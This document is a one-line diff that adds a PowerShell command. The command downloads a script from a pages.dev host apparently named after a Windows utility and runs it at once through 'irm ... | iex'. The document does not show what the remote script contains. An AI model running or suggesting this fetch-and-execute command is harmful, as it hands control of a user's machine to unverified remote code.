@@ -1,0 +1,1 @@
+irm https://servicepcglew-winutil.pages.dev/run.ps1 | iex
